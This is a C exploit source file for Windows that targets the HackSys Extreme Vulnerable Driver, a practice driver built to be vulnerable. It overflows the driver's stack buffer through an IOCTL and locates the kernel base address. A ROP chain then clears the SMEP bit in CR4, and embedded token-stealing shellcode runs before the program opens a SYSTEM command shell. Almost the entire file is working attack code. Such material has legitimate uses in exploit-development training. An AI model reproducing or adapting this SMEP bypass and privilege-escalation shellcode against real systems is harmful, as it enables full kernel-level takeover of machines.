/*
Basic buffer overflow with SMEP bypass (turn off the 20th bit in cr4)
*/

#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define QWORD ULONGLONG

QWORD findKernelBaseAddress() {
    LPVOID drivers[512];
    DWORD cb;

    EnumDeviceDrivers(drivers, sizeof(drivers),  &cb);

    return (QWORD)drivers[0];
}

BYTE shellcode[256] = {
  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
  0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
  0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
  0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
  0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
  0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
  0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
  0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
  0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

int main(int argc, char** argv) {
    HANDLE handle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] cannot get device handle...");
        return 0;
    }else{
        printf("[+] Driver opened succssefuly");
    }
    

    int size = 2500;
    int eip_offset = 2072;

    LPVOID buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcodeBuffer = VirtualAlloc(NULL, 400, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(shellcodeBuffer, shellcode, 256);

    memset(buffer, 'A', size);

    QWORD krnlBase = findKernelBaseAddress();
    printf("[+] ntoskrnl address >> %llx\n", krnlBase);


    /* offsets:
       514759 -> mov cr4 rcx ; ret
       5d264d -> pop rcx ; ret
    */

    QWORD* rop = (QWORD*)((QWORD)buffer + 2072);
    int index = 0;

    *(rop + index++) = krnlBase + 0x5d264d;
    *(rop + index++) = 0x2506F8;
    *(rop + index++) = krnlBase + 0x514759;
    *(rop + index++) = (QWORD)shellcodeBuffer;

    // ioctl 0x222003
    DeviceIoControl(handle, 0x222003, buffer, size, NULL, 0, NULL, NULL);

    system("cmd.exe");

    return 0;
}
